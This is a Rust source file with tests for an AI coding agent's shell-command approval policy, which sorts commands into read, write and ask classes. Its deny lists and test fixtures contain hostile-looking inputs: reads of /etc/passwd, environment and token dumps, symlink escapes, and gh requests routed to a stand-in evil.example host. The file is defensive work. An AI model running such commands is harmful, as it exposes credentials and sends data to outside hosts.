//! Approval policy, not a sandbox: commands can reach anything the account can.
//! Shell startup files, project configuration and the person's CLI authentication
//! are trusted. Inspection through `gh` is an explicit authenticated-network exception.
use std::path::{Component, Path, PathBuf};
use zephium_core::work::runtime::{WorkCommandClassV1 as Class, WorkCommandReasonV1 as Reason};

#[derive(Debug, PartialEq)]
enum Token {
    Word(String),
    Separator,
    Redirect(bool),
}

/// A deliberately small grammar. Unsupported shell syntax always asks.
fn tokenize(line: &str) -> Result<Vec<Token>, ()> {
    if line.contains(['$', '`', '\n', '\r', '(', ')', '{', '}', '*', '?', '[', ']']) {
        return Err(());
    }
    let mut chars = line.chars().peekable();
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut started = false;
    let mut quote = None;
    while let Some(c) = chars.next() {
        if c == '\\' && quote != Some('\'') {
            word.push(chars.next().ok_or(())?);
            started = true;
            continue;
        }
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else {
                word.push(c);
            }
            continue;
        }
        match c {
            '\'' | '"' => {
                quote = Some(c);
                started = true;
            }
            ' ' | '\t' | '|' | '&' | ';' | '<' | '>' => {
                if started {
                    tokens.push(Token::Word(std::mem::take(&mut word)));
                    started = false;
                }
                match c {
                    '|' | '&' | ';' => {
                        if chars.peek() == Some(&c) {
                            chars.next();
                        } else if c == '&' {
                            return Err(());
                        }
                        tokens.push(Token::Separator);
                    }
                    '<' | '>' => {
                        if chars.peek() == Some(&c) {
                            if c == '<' {
                                return Err(());
                            }
                            chars.next();
                        }
                        if chars.peek() == Some(&'&') {
                            return Err(());
                        }
                        tokens.push(Token::Redirect(c == '>'));
                    }
                    _ => {}
                }
            }
            '#' => return Err(()),
            _ => {
                word.push(c);
                started = true;
            }
        }
    }
    if quote.is_some() {
        return Err(());
    }
    if started {
        tokens.push(Token::Word(word));
    }
    if tokens.is_empty() {
        return Err(());
    }
    Ok(tokens)
}

fn resolve(cwd: &Path, value: &str) -> Option<PathBuf> {
    if value.contains('~')
        || Path::new(value)
            .components()
            .any(|part| part == Component::ParentDir)
    {
        return None;
    }
    let path = if Path::new(value).is_absolute() {
        PathBuf::from(value)
    } else {
        cwd.join(value)
    };
    let mut normalized = PathBuf::new();
    for part in path.components() {
        match part {
            // Lexically folding a parent after a symlink can hide an escape.
            Component::ParentDir => return None,
            Component::CurDir => {}
            other => normalized.push(other),
        }
    }
    let mut ancestor = normalized.as_path();
    let mut suffix = Vec::new();
    while !ancestor.exists() {
        suffix.push(ancestor.file_name()?);
        ancestor = ancestor.parent()?;
    }
    let mut canonical = ancestor.canonicalize().ok()?;
    for name in suffix.into_iter().rev() {
        canonical.push(name);
    }
    Some(canonical)
}
fn path_argument(arg: &str) -> Option<&str> {
    let value = arg.split_once('=').map_or(arg, |(_, value)| value);
    if value.starts_with('-') && !value.starts_with("--") {
        if let Some(slash) = value.find('/') {
            return Some(&value[slash..]);
        }
    }
    (!value.is_empty() && (!value.starts_with('-') || value.contains('/') || value.contains('~')))
        .then_some(value)
}

pub fn classify(line: &str, cwd: &Path, roots: &[PathBuf]) -> (Class, Reason) {
    #[cfg(target_os = "windows")]
    {
        classify_windows(line, cwd, roots)
    }
    #[cfg(not(target_os = "windows"))]
    {
        classify_posix(line, cwd, roots)
    }
}

// Only a single literal invocation can inherit a folder approval on Windows.
// PowerShell expansion, pipelines, expressions and unknown commands ask for
// approval of the exact command; the POSIX allowlist cannot interpret them.
#[cfg(any(target_os = "windows", test))]
fn classify_windows(line: &str, cwd: &Path, roots: &[PathBuf]) -> (Class, Reason) {
    let ask = (Class::Ask, Reason::ShellSyntax);
    if line.contains([
        '$', '`', '\n', '\r', '(', ')', '{', '}', '[', ']', '*', '?', '@', '%', '^', '#', ';', '|',
        '&', '<', '>', ',',
    ]) {
        return ask;
    }
    let mut args = Vec::new();
    let mut word = String::new();
    let mut quote = None;
    let mut started = false;
    for c in line.chars() {
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else if c == '\'' || c == '"' {
                return ask;
            } else {
                word.push(c);
            }
        } else {
            match c {
                '\'' | '"' => {
                    if started {
                        return ask;
                    }
                    quote = Some(c);
                    started = true;
                }
                ' ' | '\t' => {
                    if started {
                        args.push(std::mem::take(&mut word));
                        started = false;
                    }
                }
                _ => {
                    word.push(c);
                    started = true;
                }
            }
        }
    }
    if quote.is_some() {
        return ask;
    }
    if started {
        args.push(word);
    }
    let Some(program) = args.first() else {
        return ask;
    };
    let program = program.to_ascii_lowercase();
    let program = program.strip_suffix(".exe").unwrap_or(&program);
    let parameters: Option<&[&str]> = match program {
        "get-location" | "pwd" => Some(&[]),
        "get-childitem" | "ls" | "dir" | "gci" => Some(&[
            "-path",
            "-literalpath",
            "-name",
            "-file",
            "-directory",
            "-force",
        ]),
        "get-content" | "cat" | "gc" => Some(&[
            "-path",
            "-literalpath",
            "-totalcount",
            "-tail",
            "-raw",
            "-encoding",
        ]),
        "write-output" | "echo" => Some(&["-inputobject", "-noenumerate"]),
        "set-content" | "sc" | "add-content" | "ac" => {
            Some(&["-path", "-literalpath", "-value", "-nonewline", "-encoding"])
        }
        "new-item" | "ni" => Some(&["-path", "-name", "-itemtype", "-value"]),
        "copy-item" | "cp" | "copy" | "cpi" | "move-item" | "mv" | "move" | "mi" => {
            Some(&["-path", "-literalpath", "-destination"])
        }
        _ => None,
    };
    if parameters.is_some_and(|allowed| {
        args.iter().skip(1).any(|arg| {
            arg.starts_with('-')
                && !allowed
                    .iter()
                    .any(|parameter| arg.eq_ignore_ascii_case(parameter))
        })
    }) {
        return ask;
    }
    let translated = match program {
        "get-location" | "pwd" => "pwd",
        "get-childitem" | "ls" | "dir" | "gci" => "ls",
        "get-content" | "cat" | "gc" => "cat",
        "write-output" | "echo" => "echo",
        "set-content" | "sc" | "add-content" | "ac" | "new-item" | "ni" | "copy-item" | "cp"
        | "copy" | "cpi" | "move-item" | "mv" | "move" | "mi" => "cp",
        "remove-item" | "rm" | "del" | "erase" | "rmdir" | "rd" | "ri" => {
            return (Class::Ask, Reason::Destructive)
        }
        "invoke-webrequest" | "iwr" | "wget" | "curl" | "invoke-restmethod" | "irm" => {
            return (Class::Ask, Reason::Network)
        }
        "git" | "gh" | "rg" | "cargo" | "rustc" | "node" | "pnpm" | "npm" | "yarn" | "bun"
        | "python" | "python3" | "go" | "pytest" => program,
        _ => return (Class::Ask, Reason::UnknownProgram),
    };
    // Provider paths and alternate streams must never masquerade as descendants.
    if args.iter().skip(1).any(|arg| {
        arg.split(['/', '\\']).any(|part| part == "..")
            || arg.contains(':')
                && !(arg.as_bytes().get(1) == Some(&b':')
                    && arg.as_bytes()[0].is_ascii_alphabetic()
                    && matches!(arg.as_bytes().get(2), Some(b'\\' | b'/'))
                    && !arg[2..].contains(':'))
    }) {
        return (Class::Ask, Reason::OutsideRoots);
    }
    args[0] = translated.to_owned();
    let literal = args
        .iter()
        .map(|arg| format!("'{arg}'"))
        .collect::<Vec<_>>()
        .join(" ");
    classify_posix(&literal, cwd, roots)
}

fn classify_posix(line: &str, cwd: &Path, roots: &[PathBuf]) -> (Class, Reason) {
    let Ok(tokens) = tokenize(line) else {
        return (Class::Ask, Reason::ShellSyntax);
    };
    let mut result = (Class::Read, Reason::Inspection);
    let mut args = Vec::new();
    let mut index = 0;
    let mut current = cwd.to_path_buf();
    while index <= tokens.len() {
        if index == tokens.len() || matches!(tokens[index], Token::Separator) {
            if args.is_empty() {
                return (Class::Ask, Reason::ShellSyntax);
            }
            let mut next = simple(&args);
            if args[0] == "git" && next.0 == Class::Read && repository_runs_programs(&current) {
                next = (Class::Ask, Reason::ShellSyntax);
            }
            if next.0 > result.0 {
                result = next;
            }
            if args[0] == "cd" {
                if args.len() != 2 {
                    return (Class::Ask, Reason::ShellSyntax);
                }
                let Some(path) = resolve(&current, &args[1]) else {
                    return (Class::Ask, Reason::OutsideRoots);
                };
                if !roots.iter().any(|root| path.starts_with(root)) {
                    return (Class::Ask, Reason::OutsideRoots);
                }
                current = path;
            }
            args.clear();
            index += 1;
            continue;
        }
        match &tokens[index] {
            Token::Word(word) => {
                if let Some(value) = path_argument(word) {
                    if !resolve(&current, value)
                        .is_some_and(|p| roots.iter().any(|r| p.starts_with(r)))
                    {
                        return (Class::Ask, Reason::OutsideRoots);
                    }
                }
                args.push(word.clone());
            }
            Token::Redirect(write) => {
                index += 1;
                let Some(Token::Word(target)) = tokens.get(index) else {
                    return (Class::Ask, Reason::ShellSyntax);
                };
                let Some(target) = resolve(&current, target) else {
                    return (Class::Ask, Reason::OutsideRoots);
                };
                if !target.starts_with(&current) || !roots.iter().any(|r| target.starts_with(r)) {
                    return (Class::Ask, Reason::OutsideRoots);
                }
                if *write && result.0 < Class::Write {
                    result = (Class::Write, Reason::FileChange);
                }
            }
            Token::Separator => unreachable!(),
        }
        index += 1;
    }
    result
}
fn simple(args: &[String]) -> (Class, Reason) {
    let p = args[0].as_str();
    let a: Vec<&str> = args[1..].iter().map(String::as_str).collect();
    let ask = |r| (Class::Ask, r);
    let write = |r| (Class::Write, r);
    let short_flag = |letters: &[char]| {
        a.iter().any(|arg| {
            arg.starts_with('-')
                && !arg.starts_with("--")
                && arg[1..].chars().any(|c| letters.contains(&c))
        })
    };
    if (p == "env" && !a.is_empty())
        || matches!(
            p,
            "command" | "builtin" | "time" | "nohup" | "nice" | "timeout" | "stdbuf"
        )
    {
        return ask(Reason::ShellSyntax);
    }
    if p.contains('=')
        || p.contains('/')
        || matches!(
            p,
            "eval" | "exec" | "xargs" | "source" | "." | "sh" | "bash" | "zsh" | "fish"
        )
    {
        return ask(Reason::ShellSyntax);
    }
    if matches!(
        p,
        "sudo"
            | "su"
            | "chmod"
            | "chown"
            | "kill"
            | "killall"
            | "pkill"
            | "launchctl"
            | "diskutil"
            | "open"
            | "osascript"
    ) {
        return ask(Reason::Privilege);
    }
    if p == "rm" || (p == "defaults" && a.first() == Some(&"write")) {
        return ask(Reason::Destructive);
    }
    if matches!(p, "curl" | "wget" | "ssh" | "scp" | "rsync" | "nc")
        || (matches!(p, "npm" | "cargo") && a.first() == Some(&"publish"))
        || (p == "docker" && a.first() == Some(&"push"))
    {
        return ask(Reason::Network);
    }
    // Reading tools that follow symbolic links read past a granted folder
    // through any link inside it, and a list of paths read from a file can
    // name anything; jq can print the command's whole environment.
    if a.iter()
        .any(|s| s.starts_with("--files0-from") || s.starts_with("--files-from"))
        || (p == "grep" && (short_flag(&['R']) || a.contains(&"--dereference-recursive")))
        || (p == "rg" && (short_flag(&['L']) || a.contains(&"--follow")))
        || (p == "find" && (short_flag(&['L']) || a.contains(&"-follow")))
        || (p == "tree" && short_flag(&['l']))
        || (p == "du" && short_flag(&['L']))
        || (p == "jq" && a.iter().any(|s| jq_reads_environment(s)))
    {
        return ask(Reason::ShellSyntax);
    }
    if p == "gh" {
        // A repository named with a host sends the request, and whatever the
        // host name carries, somewhere other than GitHub.
        if a.iter().enumerate().any(|(i, s)| {
            let value = match *s {
                "-R" | "--repo" | "--hostname" => a.get(i + 1).copied(),
                _ => s
                    .strip_prefix("--repo=")
                    .or_else(|| s.strip_prefix("--hostname="))
                    .or_else(|| s.strip_prefix("-R").filter(|rest| !rest.is_empty())),
            };
            *s == "--hostname"
                || s.starts_with("--hostname=")
                || value.is_some_and(|value| value.matches('/').count() != 1 || value.contains(':'))
        }) {
            return ask(Reason::Network);
        }
        let read = matches!(
            a.as_slice(),
            ["pr", "view" | "list" | "diff", ..]
                | ["issue", "view" | "list", ..]
                | ["run", "list" | "view", ..]
                | ["repo", "view", ..]
        );
        return if read
            && !a
                .iter()
                .any(|s| s.starts_with("--web") || s.starts_with("--browser"))
        {
            (Class::Read, Reason::Inspection)
        } else {
            ask(Reason::Network)
        };
    }
    if p == "git" {
        if a == ["--version"] {
            return (Class::Read, Reason::Inspection);
        }
        if a.is_empty() || a[0].starts_with('-') {
            return ask(Reason::ShellSyntax);
        }
        if a[0] == "push" {
            return ask(Reason::Network);
        }
        if a.iter().any(|s| s.starts_with("--force"))
            || short_flag(&['f'])
            || a[0] == "clean"
            || (a[0] == "reset" && a.contains(&"--hard"))
            || (a[0] == "branch" && (short_flag(&['d', 'D']) || a.contains(&"--delete")))
        {
            return ask(Reason::Destructive);
        }
        if a.iter().any(|s| {
            s.starts_with("--exec")
                || s.starts_with("--ext-diff")
                || s.starts_with("--textconv")
                || s.starts_with("--config")
                || s.starts_with("--upload-pack")
                || s.starts_with("--receive-pack")
        }) {
            return ask(Reason::ShellSyntax);
        }
        if a.iter().any(|s| {
            s.starts_with("--output") || s.starts_with("--rotate-to") || s.starts_with("--skip-to")
        }) {
            return write(Reason::FileChange);
        }
        let read = matches!(
            a[0],
            "status" | "log" | "diff" | "show" | "blame" | "ls-files" | "rev-parse"
        ) || a == ["remote", "-v"]
            || (a[0] == "branch"
                && a[1..]
                    .iter()
                    .all(|s| matches!(*s, "--list" | "-a" | "-r" | "--show-current")));
        return if read {
            (Class::Read, Reason::Inspection)
        } else {
            write(Reason::FileChange)
        };
    }
    if matches!(
        p,
        "rustc"
            | "cargo"
            | "node"
            | "pnpm"
            | "npm"
            | "yarn"
            | "bun"
            | "python"
            | "python3"
            | "go"
            | "pytest"
            | "make"
    ) && a == ["--version"]
    {
        return (Class::Read, Reason::Inspection);
    }
    // Inline code is a program nobody reviewed; the folder approval for
    // builds and tests does not extend to it.
    if (matches!(p, "python" | "python3" | "ruby" | "perl")
        && a.iter().any(|s| matches!(*s, "-c" | "-e" | "-E")))
        || (matches!(p, "node" | "bun" | "deno")
            && a.iter()
                .any(|s| matches!(*s, "-e" | "-p" | "--eval" | "--print")))
    {
        return ask(Reason::ShellSyntax);
    }
    if matches!(
        p,
        "cargo"
            | "rustc"
            | "node"
            | "pnpm"
            | "npm"
            | "yarn"
            | "bun"
            | "pytest"
            | "python"
            | "python3"
            | "go"
            | "make"
            | "pip"
            | "pip3"
    ) {
        return write(Reason::ProjectExecution);
    }
    if p == "find"
        && a.iter()
            .any(|s| matches!(*s, "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir"))
    {
        return ask(Reason::Destructive);
    }
    if (p == "rg" && a.iter().any(|s| s.starts_with("--pre")))
        || (p == "fd" && (short_flag(&['x', 'X']) || a.iter().any(|s| s.starts_with("--exec"))))
    {
        return ask(Reason::ShellSyntax);
    }
    if (p == "uniq" && a.iter().filter(|s| !s.starts_with('-')).count() > 1)
        || (p == "tree" && short_flag(&['o']))
        || (p == "file" && (short_flag(&['C']) || a.contains(&"--compile")))
    {
        return write(Reason::FileChange);
    }
    if p == "sort" && a.iter().any(|s| s.starts_with("--compress-program")) {
        return ask(Reason::ShellSyntax);
    }
    if (p == "sort" && (short_flag(&['o']) || a.iter().any(|s| s.starts_with("--output"))))
        || (p == "find"
            && a.iter()
                .any(|s| matches!(*s, "-fprint" | "-fprint0" | "-fprintf" | "-fls")))
    {
        return write(Reason::FileChange);
    }
    if p == "sed" {
        if a.first() == Some(&"-n")
            && a[2.min(a.len())..].iter().all(|s| !s.starts_with('-'))
            && a.get(1).is_some_and(|s| {
                s.chars()
                    .all(|c| c.is_ascii_digit() || matches!(c, ',' | 'p' | ' '))
            })
        {
            return (Class::Read, Reason::Inspection);
        }
        return if a.iter().any(|s| s.starts_with("-i")) {
            write(Reason::FileChange)
        } else {
            ask(Reason::ShellSyntax)
        };
    }
    if matches!(
        p,
        "ls" | "cat"
            | "head"
            | "tail"
            | "wc"
            | "grep"
            | "rg"
            | "fd"
            | "find"
            | "file"
            | "stat"
            | "du"
            | "tree"
            | "pwd"
            | "echo"
            | "printf"
            | "which"
            | "jq"
            | "sort"
            | "uniq"
            | "cut"
            | "tr"
            | "diff"
    ) {
        return (Class::Read, Reason::Inspection);
    }
    if matches!(p, "mkdir" | "cp" | "mv" | "touch" | "cd") {
        return write(Reason::FileChange);
    }
    ask(Reason::UnknownProgram)
}

/// Whether the repository around `cwd` names programs in its own
/// configuration that even read-only git commands run: a file-system monitor,
/// diff drivers, clean/smudge filters, an ssh command. A downloaded or shared
/// repository can carry these, so git there asks first.
fn repository_runs_programs(cwd: &Path) -> bool {
    const MAX_CONFIG_BYTES: u64 = 256 * 1024;
    let Some(dot_git) = cwd
        .ancestors()
        .take(64)
        .map(|dir| dir.join(".git"))
        .find(|path| path.exists())
    else {
        return false;
    };
    let read = |path: &Path| -> Option<String> {
        let size = std::fs::metadata(path).ok()?.len();
        if size > MAX_CONFIG_BYTES {
            return Some("[include]".into());
        }
        std::fs::read_to_string(path).ok()
    };
    let mut configs = Vec::new();
    if dot_git.is_dir() {
        configs.push(dot_git.join("config"));
        configs.push(dot_git.join("config.worktree"));
    } else {
        // A linked worktree: `.git` names its own folder, which names the
        // shared one.
        let Some(gitdir) = read(&dot_git)
            .as_deref()
            .and_then(|text| text.trim().strip_prefix("gitdir:"))
            .map(|path| dot_git.parent().unwrap_or(cwd).join(path.trim()))
        else {
            return true;
        };
        let common = read(&gitdir.join("commondir"))
            .map(|path| gitdir.join(path.trim()))
            .unwrap_or_else(|| gitdir.clone());
        configs.push(gitdir.join("config.worktree"));
        configs.push(common.join("config"));
    }
    configs
        .iter()
        .filter_map(|path| read(path))
        .any(|text| config_runs_programs(&text))
}

fn config_runs_programs(text: &str) -> bool {
    let mut section = String::new();
    for line in text.lines().map(str::trim) {
        if let Some(header) = line.strip_prefix('[') {
            let name = header.split([']', ' ', '"', '.']).next().unwrap_or("");
            section = name.to_ascii_lowercase();
            if section.starts_with("include") {
                return true;
            }
            continue;
        }
        let key = line
            .split('=')
            .next()
            .unwrap_or("")
            .trim()
            .to_ascii_lowercase();
        let runs = match section.as_str() {
            "core" => matches!(key.as_str(), "fsmonitor" | "sshcommand" | "hookspath"),
            "diff" => matches!(key.as_str(), "external" | "textconv" | "command"),
            "filter" => matches!(key.as_str(), "clean" | "smudge" | "process"),
            "gpg" => key == "program",
            _ => false,
        };
        if runs {
            return true;
        }
    }
    false
}

fn jq_reads_environment(arg: &str) -> bool {
    arg.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'))
        .any(|word| matches!(word, "env" | "$ENV" | "input_filename" | "$__loc__"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn repository_programs_make_git_ask() {
        assert!(!config_runs_programs(
            "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:o/external.git\n"
        ));
        for config in [
            "[core]\n\tfsmonitor = ./run.sh\n",
            "[diff \"img\"]\n\ttextconv = ./show\n",
            "[diff]\n\texternal = ./x\n",
            "[filter \"lfs\"]\n\tclean = ./x %f\n",
            "[include]\n\tpath = other\n",
            "[core]\n\tsshCommand = ./x\n",
        ] {
            assert!(config_runs_programs(config), "{config}");
        }
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let roots = std::slice::from_ref(&root);
        std::fs::create_dir(root.join(".git")).unwrap();
        std::fs::write(root.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        assert_eq!(classify("git status", &root, roots).0, Class::Read);
        std::fs::write(root.join(".git/config"), "[core]\n\tfsmonitor = ./hook\n").unwrap();
        assert_eq!(classify("git status", &root, roots).0, Class::Ask);
    }

    #[test]
    fn reads_that_leave_the_folder_or_github_ask_first() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let roots = std::slice::from_ref(&root);
        for line in [
            "gh pr view 1 -R secret.evil.example/o/r",
            "gh pr view 1 --repo=evil.example/o/r",
            "gh issue list --hostname evil.example",
            "gh pr list -Revil.example/o/r",
            "jq -n env",
            "jq -n $ENV",
            "grep -R KEY .",
            "grep -rR KEY .",
            "rg -L KEY",
            "rg --follow KEY",
            "find -L . -name x",
            "tree -l",
            "du -L .",
            "wc --files0-from=list",
        ] {
            assert_ne!(classify_posix(line, &root, roots).0, Class::Read, "{line}");
            assert_ne!(
                classify_windows(line, &root, roots).0,
                Class::Read,
                "{line}"
            );
        }
        for line in [
            "gh pr view 1 -R owner/repo",
            "jq .name package.json",
            "grep -r KEY .",
            "rg KEY",
        ] {
            assert_eq!(classify_posix(line, &root, roots).0, Class::Read, "{line}");
        }
    }

    #[test]
    fn windows_shell_expansion_and_aliases_require_exact_approval() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let roots = std::slice::from_ref(&root);
        for line in [
            "git status --short",
            "Get-Content 'a b.txt'",
            "LS src",
            "Get-Location",
        ] {
            assert_eq!(
                classify_windows(line, &root, roots).0,
                Class::Read,
                "{line}"
            );
        }
        for line in [
            "rm a",
            "Remove-Item a",
            "ls; Remove-Item a",
            "echo $env:TOKEN",
            "git --% status",
            "cat HKLM:\\Software",
            "cat a.txt:secret",
            "& git status",
            "g`it status",
            "echo 'a''b'",
            "cmd /c dir",
            "powershell -Command ls",
            "jq .name package.json",
            "grep -r KEY .",
        ] {
            assert_eq!(classify_windows(line, &root, roots).0, Class::Ask, "{line}");
        }
        assert_eq!(classify_windows("cargo test", &root, roots).0, Class::Write);
    }
    #[test]
    fn work_policy_table() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let reads = [
            "ls -la",
            "cat a",
            "head a",
            "tail a",
            "wc a",
            "grep hello a",
            "rg hello .",
            "fd name",
            "find . -name foo",
            "file a",
            "stat a",
            "du .",
            "tree .",
            "pwd",
            "echo hello",
            "printf '%s' hello",
            "which git",
            "jq . a",
            "sort a",
            "uniq a",
            "cut -f1 a",
            "tr a b",
            "diff a b",
            "sed -n '1,20p' a",
            "git status --short",
            "git --version",
            "git log -5",
            "git diff --stat",
            "git show HEAD",
            "git blame a",
            "git ls-files",
            "git rev-parse HEAD",
            "git remote -v",
            "git branch",
            "git branch --list",
            "git branch -a",
            "git branch -r",
            "git branch --show-current",
            "rustc --version",
            "cargo --version",
            "node --version",
            "pnpm --version",
            "npm --version",
            "yarn --version",
            "bun --version",
            "gh pr view",
            "gh pr list",
            "gh pr diff",
            "gh issue view 1",
            "gh issue list",
            "gh run list",
            "gh run view",
            "gh repo view",
            "cat a | head",
            "pwd && ls",
            "pwd||ls;echo ok",
            "echo 'a; b | c'",
            "cat < a",
        ];
        let writes = [
            "cargo check",
            "cargo test",
            "cargo build",
            "cargo clippy",
            "cargo fmt --check",
            "cargo metadata",
            "cargo tree",
            "node a.js",
            "npm test",
            "pnpm run test",
            "yarn run check",
            "bun run lint",
            "pnpm run build",
            "npm ls",
            "pnpm exec vitest",
            "pytest",
            "python -m pytest",
            "go test",
            "go vet",
            "go build",
            "make test",
            "make check",
            "make build",
            "make lint",
            "git add a",
            "git commit -m ok",
            "git checkout main",
            "git switch main",
            "git stash",
            "git merge main",
            "git rebase main",
            "git fetch",
            "git pull",
            "git clone origin repo",
            "git branch new",
            "cargo fmt",
            "pnpm install",
            "npm install",
            "cargo add serde",
            "pip install thing",
            "mkdir a",
            "cp a b",
            "mv a b",
            "touch a",
            "sed -i s/a/b/ a",
            "python3 script.py",
            "node build.js",
            "echo hi > a",
            "cat a >> b",
            "sort -o b a",
            "sort -rooutput a",
            "tree -aooutput",
            "file -iC",
            "find . -fprint a",
            "ls && cargo test",
            "cargo test || echo failed",
        ];
        let asks = [
            "custom",
            "env",
            "python3 -c 'import os'",
            "node -e 'fetch(1)'",
            "node --eval x",
            "perl -e x",
            "curl example.com",
            "wget example.com",
            "ssh host",
            "scp a host:a",
            "rsync a b",
            "nc host 80",
            "git push",
            "gh pr create",
            "gh pr merge",
            "gh pr close",
            "gh release",
            "gh api repos",
            "gh auth status",
            "npm publish",
            "cargo publish",
            "docker push image",
            "rm a",
            "git reset --hard",
            "git clean",
            "git push --force",
            "git branch -D x",
            "git checkout --force x",
            "git checkout -qf x",
            "git branch -aD x",
            "git branch --delete x",
            "find . -delete",
            "find . -exec echo a",
            "chmod +x a",
            "chown me a",
            "kill 1",
            "killall x",
            "pkill x",
            "launchctl list",
            "sudo ls",
            "su",
            "diskutil list",
            "open a",
            "osascript x",
            "defaults write x y",
            "eval ls",
            "exec ls",
            "xargs ls",
            "sh -c ls",
            "bash -c ls",
            "source a",
            "cat << EOF",
            "echo $(pwd)",
            "echo `pwd`",
            "echo $HOME",
            "cat /etc/passwd",
            "cat ../outside",
            "cat ~/a",
            "cd /tmp",
            "echo x > /tmp/a",
            "sort -o/tmp/output a",
            "tree -o/tmp/output",
            "ls |",
            "| ls",
            "echo 'broken",
            "echo \\",
            "ls &",
            "git -c core.pager=x log",
            "git diff --ext-diff",
            "rg --pre=tool x",
            "fd -x tool",
            "fd -xrm",
            "fd -Hx tool",
            "sed -n '1e' a",
            "sed -n '1p' -e 'w output' a",
            "sed -n '1p' -f script a",
            "cat escape/../outside",
            "curl x && cargo test",
        ];
        for (class, lines) in [
            (Class::Read, reads.as_slice()),
            (Class::Write, writes.as_slice()),
            (Class::Ask, asks.as_slice()),
        ] {
            for line in lines {
                assert_eq!(
                    classify_posix(line, &root, std::slice::from_ref(&root)).0,
                    class,
                    "{line}"
                );
            }
        }
    }

    #[test]
    fn windows_literal_commands_keep_native_approval_classes() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        for (class, commands) in [
            (
                Class::Read,
                vec![
                    "Get-Location",
                    "Get-ChildItem -LiteralPath . -File",
                    "Get-Content -LiteralPath file.txt -Raw",
                    "git.exe status --short",
                    "cargo --version",
                ],
            ),
            (
                Class::Write,
                vec![
                    "Set-Content -LiteralPath result.txt -Value first -NoNewline -Encoding ascii",
                    "Add-Content -LiteralPath result.txt -Value second -NoNewline -Encoding ascii",
                    "cargo test",
                    "Copy-Item -LiteralPath file.txt -Destination copy.txt",
                ],
            ),
            (
                Class::Ask,
                vec![
                    "Get-ChildItem -Recurse",
                    "Get-Content -LiteralPath file.txt -Stream secret",
                    "Get-Location -PSProvider Registry",
                    "Get-Content Registry:foo",
                    "Get-Content file.txt:secret",
                    "Remove-Item result.txt",
                    "Invoke-WebRequest example.com",
                    "echo $HOME",
                    "ls; Remove-Item file.txt",
                    "echo (Get-Date)",
                    "echo @args",
                    "cmd /c echo foo",
                    "git -c core.pager=x status",
                    "Get-Content ..\\outside.txt",
                ],
            ),
        ] {
            for command in commands {
                assert_eq!(
                    classify_windows(command, &root, std::slice::from_ref(&root)).0,
                    class,
                    "{command}"
                );
            }
        }
    }
    #[test]
    fn work_tokenizer_quotes_and_symlink_escape() {
        assert_eq!(
            tokenize("echo 'a|b' \"c;d\" e\\ f").unwrap(),
            vec![
                Token::Word("echo".into()),
                Token::Word("a|b".into()),
                Token::Word("c;d".into()),
                Token::Word("e f".into())
            ]
        );
        #[cfg(unix)]
        {
            let dir = tempfile::tempdir().unwrap();
            let root = dir.path().canonicalize().unwrap();
            std::os::unix::fs::symlink("/etc", root.join("escape")).unwrap();
            assert_eq!(
                classify_posix("cat escape/passwd", &root, std::slice::from_ref(&root)).0,
                Class::Ask
            );
        }
    }
}
